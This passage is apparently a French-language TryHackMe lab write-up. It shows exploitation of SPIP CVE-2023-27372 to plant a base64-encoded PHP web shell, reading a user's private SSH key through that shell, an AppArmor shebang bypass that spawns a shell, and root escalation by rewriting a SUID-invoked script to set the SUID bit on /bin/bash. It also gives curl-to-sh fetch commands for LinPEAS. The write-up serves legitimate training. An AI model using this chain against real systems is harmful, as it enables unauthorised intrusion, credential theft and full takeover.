<div class="highlight"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://&lt;IP-cible&gt;<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/big.txt
</code></pre></div>
<img alt="gobuster-3.png" src="../Screens/gobuster-3.png" /></p>
<p><img alt="gobuster-4.png" src="../Screens/gobuster-4.png" /></p>
<p><img alt="website-spip.png" src="../Screens/website-spip.png" /></p>
<p>Avec un peu plus de recul, il était possible de comprendre dès la page à la racine, que le serveur web utilisait le service <strong>SPIP</strong> (Système de publication pour l'Internet) est un logiciel libre destiné à la production de sites web.</p>
<p>Mais bon, maintenant que nous avons bien compris ça, il faut trouver sa version, car nous voulons savoir si SPIP présente une faille que nous pourrions exploiter, en recherchant sur le site d'<a href="https://www.exploit-db.com/">Exploit-db</a>.</p>
<p>Il a plusieurs manières de le savoir mais pour moi, c'est la commande <code>curl</code> qu'il me l'a donné :
<img alt="spip-version-3.png" src="../Screens/spip-version-3.png" /></p>
<h2 id="rce">RCE<a class="headerlink" href="#rce" title="Permanent link">&para;</a></h2>
<p>Après avoir pris l'information de la version de SPIP, je suis allé chercher sur <a href="https://www.exploit-db.com/">Exploit-db</a> s'il y avait une faille renseigné et il y a une faille renseigné sous la CVE suivante : <a href="https://www.exploit-db.com/exploits/51536">CVE-2023-27372</a>.
<img alt="exploit-db-1.png" src="../Screens/exploit-db-1.png" />
Nous avons remarqué que SPIP sur sa version 4.2 et sur cette version, il y a une faille qui permet une RCE (Remote Command Execution) cela via des valeurs de formulaire dans la zone publique car la sérialisation est mal gérée, sans avoir besoin d'être connecté.
La vulnérabilité RCE permet à un attaquant d'exécuter du code arbitraire sur un périphérique distant.
<img alt="exploit-db-2.png" src="../Screens/exploit-db-2.png" />
Il existe un <a href="https://www.exploit-db.com/raw/51536">PoC</a> (Proof of Concept) qui exploite une injection de code PHP dans SPIP. La vulnérabilité existe dans le paramètre « oubli » et permet à un utilisateur non authentifié d’exécuter des commandes arbitraires avec des privilèges d’utilisateur web.
<img alt="CVE-2023-27372-1.png" src="../Screens/CVE-2023-27372-1.png" /></p>
<p>J'ai téléchargé le code de la PoC et j'ai renommé le fichier avec la CVE :
<div class="highlight"><pre><span></span><code>mv<span class="w"> </span>Téléchargements<span class="se">\5</span><span class="m">1536</span>.py<span class="w"> </span>CVE-2023-27372.py
</code></pre></div>
<img alt="CVE-2023-27372-2.png" src="../Screens/CVE-2023-27372-2.png" /></p>
<p>Pour l'utiliser, on doit faire la commande suivante :
- <code>python CVE-2023-27372.py</code> pour faire l'exécution du code Python
- <code>-u http://&lt;IP-cible&gt;/spip</code> option pour préciser l'url avec l'ip de la cible 
- <code>-c</code> option pour préciser la commande à effectuer, entouré de <code>' '</code> 
- <code>'echo PD89YCRfR0VUWzBdYD8+|base64 -d &gt; shell.php'</code>  :</p>
<p>Il faut faire télécharger à la machine cible, un code en PHP pour transformer notre url vers le serveur web en terminal de commande :
- On va convertir ce code PHP :
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?</span><span class="o">=</span><span class="sb">`$_GET[0]`</span><span class="cp">?&gt;</span>
</code></pre></div>
- En base 64, avec <a href="https://gchq.github.io/">CyberChef</a>: 
<div class="highlight"><pre><span></span><code>PD89YCRfR0VUWzBdYD8+
</code></pre></div>
<img alt="cyberchef.png" src="../Screens/cyberchef.png" /></p>
<blockquote>
<p><strong>Pourquoi en base64 ?</strong>
Puisque le code PoC utilise déjà des guillemets dans la charge utile, il est possible d'utiliser base64 pour éviter d'être confronté à ceux de notre shell inverse.</p>
</blockquote>
<ul>
<li>Et, nous allons créer un fichier PHP avec cette base64, qu'on va décoder avec l'option <code>-d</code> : 
<div class="highlight"><pre><span></span><code>&#39;echo PD89YCRfR0VUWzBdYD8+|base64 -d &gt; shell.php&#39;
</code></pre></div></li>
</ul>
<p>Enfin, on a la commande suivante :
<div class="highlight"><pre><span></span><code>python<span class="w"> </span>CVE-2023-27372.py<span class="w"> </span>-u<span class="w"> </span>http://&lt;IP-cible&gt;/spip<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;echo PD89YCRfR0VUWzBdYD8+|base64 -d &gt; shell.php&#39;</span>
</code></pre></div>
<img alt="python%20cve.png" src="../Screens/python%20cve.png" />
Maintenant que l'on fait cette commande, nous pouvons taper cet url :
<div class="highlight"><pre><span></span><code>http://&lt;IP-cible&gt;/spip/shell.php?0=&lt;cmd&gt;
</code></pre></div></p>
<p>J'ai commencé par analyser les fichiers présents dans le répertoire utilisateur de la machine cible :
<div class="highlight"><pre><span></span><code>http://&lt;IP-cible&gt;/spip/shell.php?0=ls -la ../..
</code></pre></div>
<img alt="found%20user%20think.png" src="../Screens/found%20user%20think.png" />
<img alt="found%20user%20flag%201.png" src="../Screens/found%20user%20flag%201.png" /></p>
<p>Et, on peut voir que l'utilisateur sur la machine est <code>think</code> et qu'il y a un fichier <code>user.txt</code> :
<div class="highlight"><pre><span></span><code>http://&lt;IP-cible&gt;/spip/shell.php?0=ls -la ../../cat user.txt
</code></pre></div>
<img alt="found%20user%20flag%202.png" src="../Screens/found%20user%20flag%202.png" />
<strong>Voici le flag utilisateur !</strong></p>
<h2 id="ssh">SSH<a class="headerlink" href="#ssh" title="Permanent link">&para;</a></h2>
<p>On doit maintenant, aller plus loin pour trouver le flag root qui doit sûrement nécessité la recherche d'un terminal en root pour l'obtenir. On avais vu, au début avec le nmap, qu'il y avait un port pour le ssh donc je suis allé voir si la connexion SSH est faisable par clé :
<div class="highlight"><pre><span></span><code>http://&lt;IP-cible&gt;/spip/shell.php?0=ls -la ../../.ssh
</code></pre></div>
<img alt="found%20key%20ssh%201.png" src="../Screens/found%20key%20ssh%201.png" /></p>
<p>Et, on peut voir qu'il y a les deux clés (privé et public) rsa pour le SSH donc j'ai copié le contenu de la clé privé sur ma Kali :
<div class="highlight"><pre><span></span><code>http://&lt;IP-cible&gt;/spip/shell.php?0=cat ../../.ssh/id_rsa
</code></pre></div>
<img alt="found%20key%20ssh%202.png" src="../Screens/found%20key%20ssh%202.png" /></p>
<p><div class="highlight"><pre><span></span><code>vim<span class="w"> </span>id_rsa
head<span class="w"> </span>id_rsa
</code></pre></div>
<img alt="" src="../Screens/found%20key%20ssh%203.png" />
Donc, nous allons pouvoir ce connecté en SSH à la machine cible sur l'utilisateur think et avec la clé privé :
<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>think@&lt;IP-cible&gt;<span class="w"> </span>-i<span class="w"> </span>id_rsa
</code></pre></div>
<img alt="" src="../Screens/ssh%20connexion%201.png" /></p>
<p><img alt="" src="../Screens/ssh%20connexion%202.png" /></p>
<h2 id="escalade-de-privileges">Escalade de privilèges<a class="headerlink" href="#escalade-de-privileges" title="Permanent link">&para;</a></h2>
<p>Maintenant que nous sommes connecté en SSH, nous allons devoir chercher un moyen, une faille nous permettant de faire une escalade de privilèges afin de passer en root.</p>
<p>Malheureusement, je n'ai pas pu faire télécharger sur la machine cible, le script <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPEAS</a> avec les commandes suivantes :
<img alt="" src="../Screens/linPEAS.png" />
<div class="highlight"><pre><span></span><code><span class="c1">## From github</span>
curl<span class="w"> </span>-L<span class="w"> </span>https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>sh

<span class="c1">## Without curl</span>
python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import urllib.request; urllib.request.urlretrieve(&#39;https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh&#39;, &#39;linpeas.sh&#39;)&quot;</span>

python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import urllib.request; urllib.request.urlretrieve(&#39;https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh&#39;, &#39;linpeas.sh&#39;)&quot;</span>
</code></pre></div></p>
<p>Donc, j'ai fait cette commande manuelle qui va faire la même chose : 
Cette commande a pour but de rechercher les fichiers sur le système qui ont le bit SUID (Set User ID) défini. 
- <code>find /</code>: Lance la commande <code>find</code> à partir de la racine du système de fichiers (<code>/</code>).
- <code>-type f</code>: Limite la recherche aux fichiers ordinaires (pas de répertoires, de liens symboliques, etc.). Le <code>-type f</code> spécifie que nous cherchons des fichiers.
- <code>-perm -u=s</code>: Cherche des fichiers qui ont le bit SUID défini. 
Le bit <code>SUID</code> permet à un utilisateur d'exécuter un fichier avec les privilèges du propriétaire de ce fichier. Par exemple, si un fichier est possédé par l'utilisateur root et a le bit SUID défini, alors un utilisateur normal pourrait exécuter ce fichier avec les privilèges root.</p>
<ul>
<li><code>2&gt;/dev/null</code>: Redirige les erreurs (descripteur de fichier 2) vers <code>/dev/null</code>, ce qui signifie que les messages d'erreur seront ignorés. </li>
</ul>
<p><div class="highlight"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-perm<span class="w"> </span>-u<span class="o">=</span>s<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</code></pre></div>
<img alt="" src="../Screens/find%201.png" /></p>
<p><img alt="" src="../Screens/find%202.png" /></p>
<p>Je suis interpellé par le résultat <code>/usr/sbin/run_container</code> car cela signifie qu'il y a <code>Docker</code> installé sur la machine cible et j'en ai la preuve :
<img alt="" src="../Screens/docker%201.png" /></p>
<p>Je fais la commande strings pour afficher les chaînes de caractères imprimables dans un fichier binaire ou non texte :
<div class="highlight"><pre><span></span><code>strings<span class="w"> </span>/usr/sbin/run_container
</code></pre></div>
<img alt="" src="../Screens/docker%20strings%201.png" /></p>
<p><img alt="" src="../Screens/docker%20strings%202.png" />
Le résultat nous affiche, en clair, le script shell : <code>/opt/run_container.sh</code> ce qui veut dire que ce fichier shell est utilisé par le binaire du fichier <code>/usr/sbin/run_container</code>.</p>
<blockquote>
<p>Remarque : On peut voir que nous avons toutes les permissions (lire, écrire et exécuter) sur le dossier et du script mais pourtant, il est impossible de le modifier !</p>
</blockquote>
<p><div class="highlight"><pre><span></span><code>ls<span class="w"> </span>-la<span class="w"> </span>../..
</code></pre></div>
<img alt="" src="../Screens/docker%20run_container%202.png" />
<div class="highlight"><pre><span></span><code>ls<span class="w"> </span>-la<span class="w"> </span>/opt/run_container.sh
</code></pre></div>
<img alt="" src="../Screens/docker%20run_container%201.png" /></p>
<h2 id="app-armor">App Armor<a class="headerlink" href="#app-armor" title="Permanent link">&para;</a></h2>
<p>Perdu devant ce problème, j'ai regardé l'indice disponible sur la room, qui m'indique <code>App Armor</code> en recherchant sur Google, j'ai appris que c'est un <strong>module de sécurité du noyau Linux</strong>, utiliser pour limiter les fonctionnalités des processus s'exécutant sur le système d'exploitation hôte.
<img alt="" src="../Screens/docker%20app%20armor%201.png" /></p>
<p>Et que notre terminal n'est pas un <code>/usr/bin/bash</code> mais <code>/usr/sbin/ash</code>, vérifiable avec la commande suivante :
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="nv">$SHELL</span>
</code></pre></div>
<img alt="" src="../Screens/docker%20app%20armor%202.1.png" /></p>
<p><div class="highlight"><pre><span></span><code>cat<span class="w"> </span>/etc/passwd
</code></pre></div>
<img alt="" src="../Screens/passwd%20think.webp" />
On peut voir que le compte root a un terminal en <code>/usr/bin/bash</code> et <code>think</code> a un terminal <code>/usr/sbin/bash</code> !</p>
<p>Je suis allé voir les règles sur les fichiers de App Armor et on peut bien voir que <code>usr.sbin.ash</code> est soumis à des restrictions de lecture seule, qui fait évidemment référence à notre terminal actuel :
<div class="highlight"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>/etc/apparmor.d
ls<span class="w"> </span>-la
</code></pre></div>
<img alt="" src="../Screens/docker%20app%20armor%202.png" /></p>
<p>Donc, regardons le contenu du fichier avec la commande suivante :
<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>usr.sbin.ash
</code></pre></div>
<img alt="" src="../Screens/docker%20app%20armor%203.png" /></p>
<p>Et on peut voir que les permissions données, nous empêche d'écrire dans le dossier <code>/opt</code>. </p>
<p>Mais, en raison du <code>ix</code> sur <code>/usr/bin/** mrix</code> et <code>/usr/sbin/** mrix</code>, tout programme que nous exécutons qui se trouve dans ces chemins héritera également de cette politique.
Il faut trouver un moyen de <code>bypass</code> la sécurité de App Armor pour obtenir un terminal classique.</p>
<h2 id="shell-perl">Shell - Perl<a class="headerlink" href="#shell-perl" title="Permanent link">&para;</a></h2>
<p>En recherchant sur Internet, j'ai trouvé sur le site de <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor##apparmor-shebang-bypass">HackTricks</a> une méthode permettant de contourner l’App Armor et générer un terminal sans restrictions.</p>
<p><img alt="" src="../Screens/hacktricks.png" />
Il nous explique qu'il y a un bug : que même s'il y avait des règles qui empêche l'exécution de <strong>Perl</strong> avec certaines ressources, on peut toujours créer un fichier, spécifiant le shebang de Perl <code>##!/usr/bin/perl</code> afin que Perl l'interprète et qu'il nous créer un <strong>script shell</strong> !</p>
<p>Voici les commandes et leur descriptions détaillés :
1. <strong>Création du script Perl</strong> :
- <code>echo '##!/usr/bin/perl\nexec "/bin/sh"' &gt; /dev/shm/test.pl</code> : 
  - <code>##!/usr/bin/perl</code> : C'est la ligne de <strong>shebang</strong> qui indique que le script doit être exécuté avec l'interpréteur Perl.
  - <code>\n</code> : Séquence d'échappement représentant un saut de ligne.
  - <code>exec "/bin/sh"</code> : Cette ligne de code Perl indique à Perl d'exécuter <code>/bin/sh</code>, un shell.
  - <code>&gt; /dev/shm/test.pl</code> : Redirige la sortie de <code>echo</code> vers le fichier <code>/dev/shm/test.pl</code>.</p>
<p>Dans la méthode présenté sur <code>HackTricks</code>, <code>App Armor</code> nous empêche d'écrire dans le dossier <code>/tmp</code>. Cependant, nous pouvons toujours écrire dans le dossier <code>/dev/shm</code>, qui est une mémoire partagée temporaire (RAM), ou encore, dans le dossier <code>/var/tmp</code> est le répertoire utilisé pour stocker des fichiers temporaires.</p>
<ol>
<li><strong>Rendre le script exécutable</strong> :</li>
<li>
<p><code>chmod +x /dev/shm/test.pl</code> : Cette commande change les permissions du fichier <code>test.pl</code> pour le rendre exécutable.</p>
</li>
<li>
<p><strong>Exécution du script</strong> :</p>
</li>
<li><code>/dev/shm/test.pl</code> : Cette commande exécute le script Perl nouvellement créé.</li>
<li>Lorsque ce script est exécuté, le shebang (<code>##!/usr/bin/perl</code>) dirige l'interpréteur vers Perl.</li>
<li>Ensuite, Perl exécute la commande <code>exec "/bin/sh"</code>, lançant ainsi un shell Unix.</li>
</ol>
<p><div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;##!/usr/bin/perl\nexec &quot;/bin/sh&quot;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/dev/shm/test.pl
chmod<span class="w"> </span>+x<span class="w"> </span>/dev/shm/test.pl
/dev/shm/test.pl
</code></pre></div>
<img alt="" src="../Screens/app%20armor%20bug%20.png" /></p>
<p>En faisant cette commande, nous pouvons voir que nous sommes toujours connecté en <code>think</code> dans ce nouveau terminal avec le <code>$</code> devant le terminal :
<div class="highlight"><pre><span></span><code>whoami
</code></pre></div></p>
<h2 id="root">Root<a class="headerlink" href="#root" title="Permanent link">&para;</a></h2>
<p>Maintenant que nous avons un terminal propre, nous allons repartir sur le script <code>/opt/run_container.sh</code> ayant le bit <code>SUID</code> pour pouvoir passer sur un terminal en <code>root</code>.</p>
<p>Pour ce faire, nous allons remplacer le contenu de ce script <code>/opt/run_container.sh</code> pour qu'il ouvre un script en root. Je rappelle que nous avons tous les droit de le modifier (voir plus haut) et que rien ne nous en empêche dorénavant !</p>
<p>Voici la commande et son descriptif :
- <code>echo ##!/bin/bash</code> : La commande <code>echo</code> avec le shebang Bash.
- <code>chmod +s /bin/bash</code> : Cette commande shell qui modifie les permissions du fichier <code>/bin/bash</code> en ajoutant le bit SUID (Set User ID), pour pouvoir être en root !
- <code>&gt; /opt/run_container.sh</code> :  La sortie du <code>echo</code> qui va écrasé le contenu du fichier.
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;##!/bin/bash\n chmod +s /bin/bash&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/opt/run_container.sh
</code></pre></div>
<img alt="" src="../Screens/app%20armor%20bug%202.png" /></p>
<p>Maintenant, nous allons exécuter le <code>/usr/sbin/run_container</code>, qui va appelé le script <code>/opt/run_container.sh</code> et qui va donc changer les permissions sur le dossier <code>/bin/bash</code> :
<div class="highlight"><pre><span></span><code>/usr/sbin/run_container
ls<span class="w"> </span>-la<span class="w"> </span>/bin/bash
</code></pre></div>
<img alt="" src="../Screens/app%20armor%20bug%203.png" /></p>
<p><img alt="" src="../Screens/app%20armor%20bug%205.png" /></p>
<p>Enfin, nous allons terminer par la commande suivante, qui nous faire passer pour le compte root dans ce terminal car la commande <code>/bin/bash -p</code> lance un shell Bash avec les paramètres de privilège conservés (<code>root</code>) :
<div class="highlight"><pre><span></span><code>/bin/bash<span class="w"> </span>-p
</code></pre></div>
<img alt="" src="../Screens/app%20armor%20bug%204.1.png" /></p>
<p>Et en faisant cette commande, nous pouvons voir que nous sommes maintenant connecté en tant que root !
<div class="highlight"><pre><span></span><code>whoami
</code></pre></div>
<img alt="" src="../Screens/app%20armor%20bug%204.3.png" /></p>
<p>Dans ce nouveau terminal bash en root, avec <code>bash-5.0##</code> devant le terminal, nous trouvons  facilement le fichier <code>root.txt</code> contenant le dernier flag de la room :
<div class="highlight"><pre><span></span><code>ls<span class="w"> </span>-la
cat<span class="w"> </span>root.txt
</code></pre></div>
<img alt="" src="../Screens/root%20flag.png" /></p>
<p><strong>Voici le flag root !</strong></p>












                
    <div class="print-button-wrapper">
        <button onclick="window.print()" title="Imprimer cette page">🖨️ Imprimer</button>
    </div>

              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../../Injection%20SQL%20Lab/Injection%20SQL%20-%20TryHackMe/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Injection SQL   TryHackMe">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                Injection SQL   TryHackMe
              </div>
            </div>
          </a>
        
        
          
          <a href="../../Rabbit%20store/Rabbit%20store%20-%20TryHackMe/" class="md-footer__link md-footer__link--next" aria-label="Next: Rabbit store   TryHackMe">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                Rabbit store   TryHackMe
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2025 Thibaut Vandier
    </div>
  
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://www.reddit.com/user/redt974/" target="_blank" rel="noopener" title="www.reddit.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M0 256C0 114.6 114.6 0 256 0s256 114.6 256 256-114.6 256-256 256H37.1c-13.7 0-20.5-16.5-10.9-26.2L75 437C28.7 390.7 0 326.7 0 256m349.6-102.4c23.6 0 42.7-19.1 42.7-42.7s-19.1-42.7-42.7-42.7c-20.6 0-37.8 14.6-41.8 34-34.5 3.7-61.4 33-61.4 68.4v.2c-37.5 1.6-71.8 12.3-99 29.1-10.1-7.8-22.8-12.5-36.5-12.5-33 0-59.8 26.8-59.8 59.8 0 24 14.1 44.6 34.4 54.1 2 69.4 77.6 125.2 170.6 125.2s168.7-55.9 170.6-125.3c20.2-9.6 34.1-30.2 34.1-54 0-33-26.8-59.8-59.8-59.8-13.7 0-26.3 4.6-36.4 12.4-27.4-17-62.1-27.7-100-29.1v-.2c0-25.4 18.9-46.5 43.4-49.9 4.4 18.8 21.3 32.8 41.5 32.8zm-172.5 93.3c16.7 0 29.5 17.6 28.5 39.3s-13.5 29.6-30.3 29.6-31.4-8.8-30.4-30.5S160.3 247 177 247zm190.1 38.3c1 21.7-13.7 30.5-30.4 30.5s-29.3-7.9-30.3-29.6 11.8-39.3 28.5-39.3 31.2 16.6 32.1 38.3zm-48.1 56.7c-10.3 24.6-34.6 41.9-63 41.9s-52.7-17.3-63-41.9c-1.2-2.9.8-6.2 3.9-6.5 18.4-1.9 38.3-2.9 59.1-2.9s40.7 1 59.1 2.9c3.1.3 5.1 3.6 3.9 6.5"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://github.com/redt974" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://www.linkedin.com/in/thibaut-vandier-558b47285/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "content.code.copy", "content.tabs.link", "header.autohide", "announce.dismiss", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../assets/javascripts/bundle.c8b220af.min.js"></script>
      
    
  </body>
</html>